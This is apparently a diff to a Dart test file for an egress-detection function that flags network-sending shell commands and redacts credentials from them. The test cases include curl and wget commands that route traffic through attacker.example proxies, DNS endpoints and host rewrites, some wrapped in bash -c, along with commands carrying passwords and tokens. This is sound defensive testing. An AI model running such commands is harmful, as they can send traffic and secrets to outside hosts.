@@ -330,13 +330,33 @@ void main() {
         'curl --proxy=https://proxy.attacker.example http://localhost/health',
         'curl --proxy https://proxy.attacker.example http://localhost/health',
         'curl --doh-url=https://dns.attacker.example/dns-query http://localhost',
-        'curl --callback=https://callback.attacker.example http://localhost',
       ]) {
         expect(
           egressSensitiveCommandMatch(command),
           isNotNull,
           reason: command,
         );
+      }
+    });
+
+    test('classifies curl endpoint rewrites by their actual destination', () {
+      for (final command in const <String>[
+        'curl --resolve=localhost:80:203.0.113.20 http://localhost',
+        'curl --resolve localhost:80:attacker.example http://localhost',
+        'curl --connect-to=localhost:80:attacker.example:443 http://localhost',
+        'curl --connect-to localhost:80:attacker.example:443 http://localhost',
+      ]) {
+        expect(
+          egressSensitiveCommandMatch(command),
+          isNotNull,
+          reason: command,
+        );
+      }
+      for (final command in const <String>[
+        'curl --resolve=localhost:80:127.0.0.1 http://localhost',
+        'curl --connect-to=localhost:80:127.0.0.1:8080 http://localhost',
+      ]) {
+        expect(egressSensitiveCommandMatch(command), isNull, reason: command);
       }
     });
 
@@ -374,6 +394,30 @@ void main() {
       expect(egressSensitiveCommandMatch('find . -name README.md'), isNull);
     });
 
+    test('recurses through shell short option combinations containing c', () {
+      for (final command in const <String>[
+        "bash -ec 'curl https://example.com/private'",
+        "sh -xc 'curl https://example.com/private'",
+        "zsh -euxc 'curl https://example.com/private'",
+        "bash -e -c 'curl https://example.com/private'",
+        "bash -o errexit -c 'curl https://example.com/private'",
+      ]) {
+        expect(
+          egressSensitiveCommandMatch(command),
+          isNotNull,
+          reason: command,
+        );
+      }
+      expect(egressSensitiveCommandMatch("bash -ec 'echo safe'"), isNull);
+      expect(
+        egressSensitiveCommandMatch('bash --mystery echo safe'),
+        isNotNull,
+      );
+      expect(egressSensitiveCommandMatch('bash -ec'), isNotNull);
+      expect(egressSensitiveCommandMatch('bash script.sh'), isNotNull);
+      expect(egressSensitiveCommandMatch('sh'), isNotNull);
+    });
+
     test(
       'holds unquoted environment expansions that require field splitting',
       () {
@@ -407,6 +451,35 @@ void main() {
       expect(match?.commandLine, isNot(contains('alice:pw')));
       expect(match?.commandLine, contains('<redacted>'));
       expect(match?.commandLine, contains('https://example.com/<redacted>'));
+    });
+
+    test('redacts bare URL and TLS credential option values', () {
+      const secret = 'tls-option-secret';
+      final match = egressSensitiveCommandMatch(
+        'curl --tlspassword=$secret '
+        '--proxy-tlspassword $secret '
+        '--cert client.pem:$secret '
+        'example.com/upload?token=$secret',
+      );
+
+      expect(match, isNotNull);
+      expect(match?.commandLine, isNot(contains(secret)));
+      expect(match?.commandLine, contains('example.com/<redacted>'));
+    });
+
+    test('redacts wget passwords and non-HTTP URL userinfo', () {
+      const secret = 'scheme-userinfo-secret';
+      for (final command in const <String>[
+        'wget --password $secret '
+            'ftp://alice:$secret@files.example/private',
+        'curl --proxy=socks5://alice:$secret@proxy.example '
+            'http://localhost/health',
+      ]) {
+        final match = egressSensitiveCommandMatch(command);
+        expect(match, isNotNull, reason: command);
+        expect(match?.commandLine, isNot(contains(secret)), reason: command);
+        expect(match?.commandLine, isNot(contains('alice:')), reason: command);
+      }
     });
 
     test('does not infer network egress from arbitrary argument words', () {
